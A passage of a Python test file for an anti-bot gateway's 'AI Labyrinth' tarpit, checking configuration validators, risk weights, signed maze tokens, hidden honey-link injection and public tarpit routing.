                 "custom-rule-block", "honeypot")
    for r in must_have:
        m = proxy._reason_method(r)
        assert m != "other", f"{r} should map to a method bucket, got 'other'"


# ── 1.6.8/1.6.9 AI Labyrinth tests ──────────────────────────────────────────

def test_168_labyrinth_knobs_in_hot_reload():
    """LABYRINTH_* hot-reload knobs are registered and validators are correct."""
    for knob in ("LABYRINTH_ENABLED", "LABYRINTH_SLOW_MS",
                 "LABYRINTH_MAX_DEPTH", "LABYRINTH_LINKS_PER_PAGE"):
        assert knob in proxy._HOT_RELOAD_KNOBS, f"{knob} missing from _HOT_RELOAD_KNOBS"

    _, v_ms = proxy._HOT_RELOAD_KNOBS["LABYRINTH_SLOW_MS"]
    assert v_ms(0) is True
    assert v_ms(600) is True
    assert v_ms(30000) is True
    assert v_ms(30001) is False   # above max

    _, v_depth = proxy._HOT_RELOAD_KNOBS["LABYRINTH_MAX_DEPTH"]
    assert v_depth(1) is True
    assert v_depth(20) is True
    assert v_depth(0) is False
    assert v_depth(21) is False

    _, v_links = proxy._HOT_RELOAD_KNOBS["LABYRINTH_LINKS_PER_PAGE"]
    assert v_links(1) is True
    assert v_links(10) is True
    assert v_links(0) is False
    assert v_links(11) is False


def test_168_labyrinth_tarpit_walk_in_risk_weights():
    """tarpit-walk must be in RISK_WEIGHTS with weight >= 50."""
    assert "tarpit-walk" in proxy.RISK_WEIGHTS
    assert proxy.RISK_WEIGHTS["tarpit-walk"] >= 50


def test_168_labyrinth_tarpit_walk_high_weight():
    """tarpit-walk has a high weight (>= 50) in RISK_WEIGHTS — instant ban territory."""
    w = proxy.RISK_WEIGHTS.get("tarpit-walk", 0)
    assert w >= 50, f"tarpit-walk weight should be >= 50, got {w}"


def test_168_tarpit_token_roundtrip():
    """_tarpit_token / _tarpit_verify roundtrip: valid token returns correct depth."""
    for depth in (0, 1, 3):
        token = proxy._tarpit_token(depth)
        assert "." in token, "token should have dot-separated parts"
        result = proxy._tarpit_verify(token)
        assert result == depth, f"expected depth {depth}, got {result}"


def test_168_tarpit_verify_rejects_tampered():
    """_tarpit_verify rejects tokens with wrong signature or negative depth."""
    token = proxy._tarpit_token(0)
    parts = token.split(".", 2)
    tampered = f"{parts[0]}.{parts[1]}.{'a' * 16}"
    assert proxy._tarpit_verify(tampered) is None

    bad_depth = f"-1.{parts[1]}.{parts[2]}"
    assert proxy._tarpit_verify(bad_depth) is None

    assert proxy._tarpit_verify("") is None
    assert proxy._tarpit_verify("notadottedtoken") is None


def test_168_tarpit_inject_html_adds_hidden_div():
    """_inject_honey_links injects hidden tarpit links before </body>."""
    html = b"<html><body><p>hello</p></body></html>"
    result = proxy._inject_honey_links(html)
    assert result != html, "inject should modify the HTML"
    assert b"display:none" in result, "injected div should be hidden"
    assert b'rel="nofollow' in result, "injected links should have rel=nofollow"
    assert b"/antibot-appsec-gateway/tarpit/" in result, "injected links should point to tarpit"


def test_168_tarpit_inject_html_no_body_tag_passthrough():
    """_inject_honey_links leaves HTML without </body> tag unchanged."""
    data = b'<p>fragment without body tag</p>'
    assert proxy._inject_honey_links(data) == data


def test_168_tarpit_page_html_has_fake_content():
    """_tarpit_page_html returns non-empty HTML with convincing structure."""
    html = proxy._tarpit_page_html(0, "test-nonce")
    assert "<html" in html, "tarpit page should be full HTML"
    assert "</html>" in html, "tarpit page should be complete HTML"
    assert "/antibot-appsec-gateway/tarpit/" in html, "tarpit page should contain maze links"


def test_168_tarpit_public_subpath_registered():
    """/tarpit/ must be in _ADMIN_PUBLIC_SUBPATHS so bots can reach the endpoint."""
    assert "/tarpit/" in proxy._ADMIN_PUBLIC_SUBPATHS, (
        "/tarpit/ missing from _ADMIN_PUBLIC_SUBPATHS — tarpit endpoint is unreachable "
        "by non-admin IPs"
    )


def test_168_admin_path_is_public_tarpit():
    """_admin_path_is_public returns True for any /antibot-appsec-gateway/tarpit/* path."""
    assert proxy._admin_path_is_public("/antibot-appsec-gateway/tarpit/0.abc.def123456789012")
    assert not proxy._admin_path_is_public("/antibot-appsec-gateway/secured/config")
    assert not proxy._admin_path_is_public("/antibot-appsec-gateway/tarpit")  # exact match (no trailing slash)
